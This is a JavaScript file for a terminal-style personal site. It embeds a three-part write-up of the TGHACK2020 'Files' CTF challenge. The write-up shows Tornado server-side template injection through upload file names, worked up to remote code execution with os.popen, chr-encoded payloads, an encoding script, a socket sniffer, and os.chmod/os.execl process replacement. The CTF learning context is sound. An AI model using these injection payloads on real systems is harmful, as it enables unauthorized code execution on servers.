"use strict";

/**
 * Configs
 */
var configs = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        general_help: "Below there's a list of commands that you can use.\nYou can use autofill by pressing the TAB key, autocompleting if there's only 1 possibility, or showing you a list of possibilities.",
        ls_help: "List information about the files and folders (the current directory by default).",
        cat_help: "Read FILE(s) content and print it to the standard output (screen).",
        whoami_help: "Print the user name associated with the current effective user ID and more info.",
        date_help: "Print the system date and time.",
        help_help: "Print this menu.",
        clear_help: "Clear the terminal screen.",
        reboot_help: "Reboot the system.",
        graphic_help: "Displays the site in a more graphic way.",
        cd_help: "Change the current working directory.",
        mv_help: "Move (rename) files.",
        rm_help: "Remove files or directories.",
        rmdir_help: "Remove directory, this command will only work if the folders are empty.",
        touch_help: "Change file timestamps. If the file doesn't exist, it's created an empty one.",
        sudo_help: "Execute a command as the superuser.",
        welcome: "CTF : TGHACK2020\nDate: 08-04-2020 -> 11-04-2020\nThis CTF was for beginner in a lot of categories, so i will not writeup the basic things.\nInstead, i'm going to writeup a very difficult challenge in web section.\nThis writeup is divide in three parts because the challenge was very long.\nName of the challenge: Files",
        internet_explorer_warning: "NOTE: I see you're using internet explorer, this sound bad for this website and your security.",
        invalid_command_message: "<value>: command not found.",
        reboot_message: "Preparing to reboot...\n\n3...\n\n2...\n\n1...\n\nRebooting...\n\n",
        permission_denied_message: "Unable to '<value>', permission denied.",
        sudo_message: "Unable to sudo using a web client.",
        usage: "Usage",
        file: "file",
        folder: "folder",
        folder_not_found: "'<value>': not such directory.",
        file_not_found: "File '<value>' not found.",
        username: "Username",
        hostname: "Host",
        platform: "Platform",
        accesible_cores: "Accessible cores",
        language: "Language",
        value_token: "<value>",
        host: "wortyClient",
        user: "guest",
        is_root: false,
        type_delay: 5
    };
    return {
        getInstance: function (options) {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

/**
 * Your files here
 */
var files = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        "first_part":`
        ------------------------------------------------------------------
        Prompt:
        We found this file sharing site. Can you hack it?

        WARNING

        Trying to brute force this challenge WILL get you banned.

        NOTE

        This challenge resets after 10 minutes.
        ------------------------------------------------------------------
        This challenge was made with Cabir, you can find his writeup at cabir.fr.
        
        When you get to the challenge site, all you can do is upload files, nothing more.
        Basically, I tell myself that the goal of the challenge must be to execute PHP code on the server side.
        So I upload an image that contains PHP: <?php phpinfo(); ?>.
        Eureka, the image is uploaded! I click on it and there, nothing, only random characters are displayed on the screen, which represents my image as text, and no phpinfo in sight.
        So I decide, to verify that my hypothesis is correct, to upload a .php file, to my great surprise, this file is accepted by the server. I click on it, and as you can imagine, there is just my php code in text form, it is not interpreted.
        We can therefore deduce that the payload is not in the content of the file.


        From that moment on, me and Cabir tried a lot of payload:
        - Running php code in the filename.
        - Execute javascript code in file name
        - Execute bash commands in the file name

        None of it worked out. A small peculiarity of this challenge is that the server instantiates a session for each player, so if we break it, we have to wait 10 minutes before we can send back our payloads.

        The flaw was found by Cabir, indeed, he created a file named: {{7*7}}.
        And when he uploaded it, the file was renamed 49.
        This flaw is named SSTI, for Server Side Template Injection. 

        The continuation in part 2 of the writeup.
        `,
        "second_part":`
        So we have our vulnerability, so we have our point of entry. 
        So we're going to see PayloadAllTheThings on github, to identify the template used.
        So we try several things:
        - {{7*7}} becomes 49
        - {{7*'7'}} crashes the app
        So we're dealing with an unknown template. 

        We test a lot of payloads, but most of them crash the application, which is quite annoying because we have to wait 10 minutes for the server to restart our session.

        Cabir tries this payload: {{().}}}, but it makes his instance crash. 
        In parallel, I try this payload: {{().__class__}}, my file is renamed by :
        "<tuple>".

        Thanks to the instruction: __mro__, we can go back to the parent class, which in our case is object. 
        I remind you that the payload is injected in the filename.
        The payload becomes: {{()_class__.__mro__}}. 
        The server answers us : '<class tuple, class object>', so we need the class object. To retrieve it, we need to see the server response as an array. So we want the first clue, the payload becomes :
        {{().__class__.__mro__[1]}}
        Here we get the object class, which is the "highest" class in python. 
        So we need to list the subclasses, to see which ones are implemented, our payload is :
        {{().__class__.__mro__[1].__subclasses__}}

        So we get all the subclasses, there are more than 300. In the last classes, we see, for example: <class 'tornado.web.UIModule'>.

        So we deduce that our unknown template is tornado.
        So we will read the tornado documentation: https://www.tornadoweb.org/en/stable/.

        We notice that we can import python modules in the following way: {% import os %}.

        Perfect! So we almost have our Remote Code Execution, so I'm testing the following payload: 
        {% import os}{{{os.popen('ls',shell=True)}}
        Indeed, we use the bone popen function because, in the list of object subclasses we retrieved, there was this one: <class 'subprocess.Popen'>. This class, in python, allows to execute shell commands.

        And then my instance server crashes.
        After studying my payload, I realize that all the characters except the numbers make the server crash.

        So we have to use the chr() class of python, which will allow us to build our strings. 
        Cabir had a wonderful idea, that of creating a python script to create our payload : 
        
        import sys
        payload = ''
        i = 0
        print("COMMAND : ", sys.argv[1])

        for i in str(sys.argv[1]):
            \v if(str(i) != '{' and str(i) != '}'):
                \v \v payload = payload + str("chr("+str(ord(i))+")+")

        payload = payload[:-1]
        payload = "{% import os %}"+payload

        print("PAYLOAD")
        print(payload)

        The continuation of the writeup in part 3.`,
        "third_part":`
        I'm going to show you the payloads in a clear, non-encoded way, because with our method, our payloads become very long. 
        The payload we inject is therefore: {% import os %}{{os.popen('ls -lisah /').read()}}, with our script the payload is : 
        {% import os%}{{os.popen(chr(108)+chr(115)+chr(32)+chr(32)+chr(45)+chr(108)+chr(105)+chr(115)+chr(97)+chr(104)+ch
        r(32)+chr(47)).read()}}

        To put this in the filename, we use BurpSuite to intercept the request and thus change the filename. 
        Perfect! We have our Remote Code Execution, let's find the flag ! 
        To find it, we searched everywhere in the server, in the site files (respectively challenge.py and main.html).
        A problem arises, the flag is not in the server, or at least not directly. 

        We know that :
        We have our own container, and we access it via a reverse proxy that redirects us. 

        So we say to ourselves that the flag may be in the requests between our container and the proxy. 

        So we try to implement python scripts in /uploads, but, we can't execute them. 
        So we decide to try to run python directly through our RCE. The payload becomes : 

        cd uploads;python3 -c 'import socket;s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM|socket.SOCK_CLOEXEC|socket.SOCK_NONBLOCK);%0awhile True: f=open("out.txt", "a");f.write(str(s.recvfrom(65565)));f.close();' &

        So we put our payload in our script, and we get what we need to put in the filename.
        Unfortunately, and this every time, our payloads make our instance crash. 

        For several hours, I look for ways to intercept requests between our container and the proxy. On our container there is no tcpdump, no curl, no wget, no netcat...

        So this part becomes really complicated. So I decide to go back to my basic idea : read the documentation of the python os module. 

        I create a script that will allow me to use the tornado template as a link between our container and the proxy: 

        class MainHandler(tornado.web.RequestHandler):
            \v def get(self):
                \v \v with open('/uploads/cookies.txt', 'a+') as f:
                    \v \v \v f.write(str(self.request.headers))
                \v \v with open('/uploads/cookies.txt', 'r') as f:
                    \v \v \v self.finish(f.read())

        So now I have to make this script executable, so I use the os chmod function to do that, which I encode with our script. The payload is: 
        {% import os,sys,stat %}{{ os.chmod(str(bytes([0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x70,0x2e,0x70,0x79]),sys.stdout.encoding),stat.S_IRWXU) }}

        Here, another problem, how to launch my script, knowing that the challenge.py script is in eternal discussion with the proxy. Without the kill, we can't discuss with it.
        Moreover, if we kill the python process, we make our instance crash. 
        After rereading the documentation of the os module, I find an interesting function: execl, which allows to execute a script by replacing the script that runs, in other words challenge.py.

        So the final payload is : 
        {% import os,sys %}{{ os.execl(str(bytes([0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x70,0x2e,0x70,0x79]),sys. stdout.encoding),str(bytes([0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x70,0x2e,0x70,0x79]),sys.stdout.encoding)) }}

        We execute our final payload, and then the flag appears! 
        TG20{skilled_statistic_unhappily_icing}.

        This challenge was incredible, very hard and required a lot of thinking. Congratulations to the admins of this CTF!

        Made by Worty and Cabir.
        `,
        "Cabir":"https://cabir.fr"
    };
    return {
        getInstance: function (options) {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

/**
 * Directories here
 */
var folders = (function () {
    var instance;
    var SingletonFolders = function (options){
        var options = options || SingletonFolders.defaultOptions;
        for(var key in SingletonFolders.defaultOptions){
            this[key] = options[key] || SingletonFolders.defaultOptions[key];
        }
    };
    SingletonFolders.defaultOptions = {
        "/": "index.html",
        "..": "writeups.html"
    };
    return{
        getInstance: function(options){
            instance == void 0 && (instance = new SingletonFolders(options));
            return instance;
        }
    };
})();
var main = (function () {

    /**
     * Aux functions
     */
    var isUsingIE = window.navigator.userAgent.indexOf("MSIE ") > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./);

    var ignoreEvent = function (event) {
        event.preventDefault();
        event.stopPropagation();
    };
    
    var scrollToBottom = function () {
        window.scrollTo(0, document.body.scrollHeight);
    };
    
    var isURL = function (str) {
        return (str.startsWith("http") || str.startsWith("www")) && str.indexOf(" ") === -1 && str.indexOf("\n") === -1;
    };
    
    /**
     * Model
     */
    var InvalidArgumentException = function (message) {
        this.message = message;
        // Use V8's native method if available, otherwise fallback
        if ("captureStackTrace" in Error) {
            Error.captureStackTrace(this, InvalidArgumentException);
        } else {
            this.stack = (new Error()).stack;
        }
    };
    // Extends Error
    InvalidArgumentException.prototype = Object.create(Error.prototype);
    InvalidArgumentException.prototype.name = "InvalidArgumentException";
    InvalidArgumentException.prototype.constructor = InvalidArgumentException;

    var cmds = {
        LS: { value: "ls", help: configs.getInstance().ls_help },
        CAT: { value: "cat", help: configs.getInstance().cat_help },
        WHOAMI: { value: "whoami", help: configs.getInstance().whoami_help },
        DATE: { value: "date", help: configs.getInstance().date_help },
        HELP: { value: "help", help: configs.getInstance().help_help },
        CLEAR: { value: "clear", help: configs.getInstance().clear_help },
        REBOOT: { value: "reboot", help: configs.getInstance().reboot_help },
        CD: { value: "cd", help: configs.getInstance().cd_help },
        MV: { value: "mv", help: configs.getInstance().mv_help },
        RM: { value: "rm", help: configs.getInstance().rm_help },
        RMDIR: { value: "rmdir", help: configs.getInstance().rmdir_help },
        TOUCH: { value: "touch", help: configs.getInstance().touch_help },
        SUDO: { value: "sudo", help: configs.getInstance().sudo_help },
        GRAPHIC : { value: "graphic", help: configs.getInstance().graphic_help}
    };

    var Terminal = function (prompt, cmdLine, output, sidenav, profilePic, user, host, root, outputTimer) {
        if (!(prompt instanceof Node) || prompt.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + prompt + " for argument 'prompt'.");
        }
        if (!(cmdLine instanceof Node) || cmdLine.nodeName.toUpperCase() !== "INPUT") {
            throw new InvalidArgumentException("Invalid value " + cmdLine + " for argument 'cmdLine'.");
        }
        if (!(output instanceof Node) || output.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
        }
        if (!(sidenav instanceof Node) || sidenav.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + sidenav + " for argument 'sidenav'.");
        }
        if (!(profilePic instanceof Node) || profilePic.nodeName.toUpperCase() !== "IMG") {
            throw new InvalidArgumentException("Invalid value " + profilePic + " for argument 'profilePic'.");
        }
        (typeof user === "string" && typeof host === "string") && (this.completePrompt = user + "@" + host + ":~/writeups/tghack2020/" + (root ? "#" : "$"));
        this.profilePic = profilePic;
        this.prompt = prompt;
        this.cmdLine = cmdLine;
        this.output = output;
        this.sidenav = sidenav;
        this.sidenavOpen = false;
        this.sidenavElements = [];
        this.typeSimulator = new TypeSimulator(outputTimer, output);
    };

    Terminal.prototype.type = function (text, callback) {
        this.typeSimulator.type(text, callback);
    };

    Terminal.prototype.exec = function () {
        var command = this.cmdLine.value;
        this.cmdLine.value = "";
        this.prompt.textContent = "";
        this.output.innerHTML += "<span class=\"prompt-color\">" + this.completePrompt + "</span> " + command + "<br/>";
    };

    Terminal.prototype.init = function () {
        this.sidenav.addEventListener("click", ignoreEvent);
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
        this.prepareSideNav();
        this.lock(); // Need to lock here since the sidenav elements were just added
        document.body.addEventListener("click", function (event) {
            if (this.sidenavOpen) {
                this.handleSidenav(event);
            }
            this.focus();
        }.bind(this));
        this.cmdLine.addEventListener("keydown", function (event) {
            if (event.which === 13 || event.keyCode === 13) {
                this.handleCmd();
                ignoreEvent(event);
            } else if (event.which === 9 || event.keyCode === 9) {
                this.handleFill();
                ignoreEvent(event);
            }
        }.bind(this));
        this.reset();
    };

    Terminal.makeElementDisappear = function (element) {
        element.style.opacity = 0;
        element.style.transform = "translateX(-300px)";
    };

    Terminal.makeElementAppear = function (element) {
        element.style.opacity = 1;
        element.style.transform = "translateX(0)";
    };

    Terminal.prototype.prepareSideNav = function () {
        var capFirst = (function () {
            return function (string) {
                return string.charAt(0).toUpperCase() + string.slice(1);
            }
        })();
        for (var file in files.getInstance()) {
            var element = document.createElement("button");
            Terminal.makeElementDisappear(element);
            element.onclick = function (file, event) {
                this.handleSidenav(event);
                this.cmdLine.value = "cat " + file + " ";
                this.handleCmd();
            }.bind(this, file);
            element.appendChild(document.createTextNode(capFirst(file.replace(/\.[^/.]+$/, "").replace(/_/g, " "))));
            this.sidenav.appendChild(element);
            this.sidenavElements.push(element);
        }
        // Shouldn't use document.getElementById but Terminal is already using loads of params
        document.getElementById("sidenavBtn").addEventListener("click", this.handleSidenav.bind(this));
    };

    Terminal.prototype.handleSidenav = function (event) {
        if (this.sidenavOpen) {
            this.profilePic.style.opacity = 0;
            this.sidenavElements.forEach(Terminal.makeElementDisappear);
            this.sidenav.style.width = "50px";
            document.getElementById("sidenavBtn").innerHTML = "&#9776;";
            this.sidenavOpen = false;
        } else {
            this.sidenav.style.width = "300px";
            this.sidenavElements.forEach(Terminal.makeElementAppear);
            document.getElementById("sidenavBtn").innerHTML = "&times;";
            this.profilePic.style.opacity = 1;
            this.sidenavOpen = true;
        }
        document.getElementById("sidenavBtn").blur();
        ignoreEvent(event);
    };

    Terminal.prototype.lock = function () {
        this.exec();
        this.cmdLine.blur();
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
    };

    Terminal.prototype.unlock = function () {
        this.cmdLine.disabled = false;
        this.prompt.textContent = this.completePrompt;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = false;
        });
        scrollToBottom();
        this.focus();
    };

    Terminal.prototype.handleFill = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CAT.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CAT.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                for (var file in files.getInstance()) {
                    if (file.toLowerCase().startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CAT.value + " " + file);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }else if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CD.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CD.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                for (var folder in folders.getInstance()) {
                    if (folder.toLowerCase().startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CD.value + " " + folder);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }
    };

    Terminal.prototype.handleCmd = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        this.lock();
        switch (cmdComponents[0]) {
            case cmds.CAT.value:
                this.cat(cmdComponents);
                break;
            case cmds.LS.value:
                this.ls();
                break;
            case cmds.WHOAMI.value:
                this.whoami();
                break;
            case cmds.DATE.value:
                this.date();
                break;
            case cmds.HELP.value:
                this.help();
                break;
            case cmds.CLEAR.value:
                this.clear();
                break;
            case cmds.REBOOT.value:
                this.reboot();
                break;
            case cmds.CD.value:
                this.cd(cmdComponents);
                break;
            case cmds.MV.value:
            case cmds.RMDIR.value:
            case cmds.RM.value:
            case cmds.TOUCH.value:
                this.permissionDenied(cmdComponents);
                break;
            case cmds.SUDO.value:
                this.sudo();
                break;
            case cmds.GRAPHIC.value:
                this.graphic();
                break;
            default:
                this.invalidCommand(cmdComponents);
                break;
        };
    };

    Terminal.prototype.cd = function (cmdComponents) {
        window.location.href = folders.getInstance()[cmdComponents[1]];
    };

    Terminal.prototype.cat = function (cmdComponents) {
        var result;
        if (cmdComponents.length <= 1) {
            result = configs.getInstance().usage + ": " + cmds.CAT.value + " <" + configs.getInstance().file + ">";
        } else if (!cmdComponents[1] || (!cmdComponents[1] === configs.getInstance().welcome_file_name || !files.getInstance().hasOwnProperty(cmdComponents[1]))) {
            result = configs.getInstance().file_not_found.replace(configs.getInstance().value_token, cmdComponents[1]);
        } else {
            result = cmdComponents[1] === configs.getInstance().welcome_file_name ? configs.getInstance().welcome : files.getInstance()[cmdComponents[1]];
        }
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.ls = function () {
        var result = "";
        for(var folder in folders.getInstance()){
            result += "drwxr-xr-x "+folder + "\n";
        }
        for(var file in files.getInstance()){
            result += "-rwxrw-rw- "+file + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.sudo = function () {
        this.type(configs.getInstance().sudo_message, this.unlock.bind(this));
    }

    Terminal.prototype.whoami = function (cmdComponents) {
        var result = configs.getInstance().username + ": " + configs.getInstance().user + "\n" + configs.getInstance().hostname + ": " + configs.getInstance().host + "\n" + configs.getInstance().platform + ": " + navigator.platform + "\n" + configs.getInstance().accesible_cores + ": " + navigator.hardwareConcurrency + "\n" + configs.getInstance().language + ": " + navigator.language;
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.date = function (cmdComponents) {
        this.type(new Date().toString(), this.unlock.bind(this));
    };

    Terminal.prototype.help = function () {
        var result = configs.getInstance().general_help + "\n\n";
        for (var cmd in cmds) {
            result += cmds[cmd].value + " - " + cmds[cmd].help + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.clear = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        this.prompt.textContent = this.completePrompt;
        this.unlock();
    };

    Terminal.prototype.reboot = function () {
        this.type(configs.getInstance().reboot_message, this.reset.bind(this));
    };

    Terminal.prototype.reset = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        if (this.typeSimulator) {
            this.type(configs.getInstance().welcome + (isUsingIE ? "\n" + configs.getInstance().internet_explorer_warning : ""), function () {
                this.unlock();
            }.bind(this));
        }
    };

    Terminal.prototype.graphic = function(){
        document.location.href="/graphic.html";
    };

    Terminal.prototype.permissionDenied = function (cmdComponents) {
        this.type(configs.getInstance().permission_denied_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.invalidCommand = function (cmdComponents) {
        this.type(configs.getInstance().invalid_command_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.focus = function () {
        this.cmdLine.focus();
    };

    var TypeSimulator = function (timer, output) {
        var timer = parseInt(timer);
        if (timer === Number.NaN || timer < 0) {
            throw new InvalidArgumentException("Invalid value " + timer + " for argument 'timer'.");
        }
        if (!(output instanceof Node)) {
            throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
        }
        this.timer = timer;
        this.output = output;
    };

    TypeSimulator.prototype.type = function (text, callback) {
        if (isURL(text)) {
            window.open(text);
        }
        var i = 0;
        var output = this.output;
        var timer = this.timer;
        var skipped = false;
        var skip = function () {
            skipped = true;
        }.bind(this);
        document.addEventListener("dblclick", skip);
        (function typer() {
            if (i < text.length) {
                var char = text.charAt(i);
                var isNewLine = char === "\n";
                output.innerHTML += isNewLine ? "<br/>" : char;
                i++;
                if (!skipped) {
                    setTimeout(typer, isNewLine ? timer : timer);
                } else {
                    output.innerHTML += (text.substring(i).replace(new RegExp("\n", 'g'), "<br/>")) + "<br/>";
                    document.removeEventListener("dblclick", skip);
                    callback();
                }
            } else if (callback) {
                output.innerHTML += "<br/>";
                document.removeEventListener("dblclick", skip);
                callback();
            }
            scrollToBottom();
        })();
    };

    return {
        listener: function () {
            new Terminal(
                document.getElementById("prompt"),
                document.getElementById("cmdline"),
                document.getElementById("output"),
                document.getElementById("sidenav"),
                document.getElementById("profilePic"),
                configs.getInstance().user,
                configs.getInstance().host,
                configs.getInstance().is_root,
                configs.getInstance().type_delay
            ).init();
        }
    };
})();

window.onload = main.listener;
